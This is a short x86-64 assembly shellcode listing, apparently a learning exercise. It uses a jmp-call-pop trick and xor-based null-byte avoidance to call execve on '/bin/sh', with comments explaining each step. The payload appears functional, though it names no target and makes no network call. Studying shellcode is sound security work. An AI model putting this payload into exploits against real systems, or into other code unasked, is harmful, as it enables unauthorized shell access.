.section .data
#since the data section doesnot come in the disassembly we need to move it to the text section
.section .text
.globl _start
_start:
jmp end
#Here is the trick to obtain the instruction into rdi register

hop:
pop %rdi

xor %esi,%esi # toremove null, instead of directly storing the value perform xor
xor %edx,%edx 
#mov $59,%al #move the address of execl into al register
leal 59(%edx),%eax


syscall

end:
call hop
.string "/bin/sh\0"




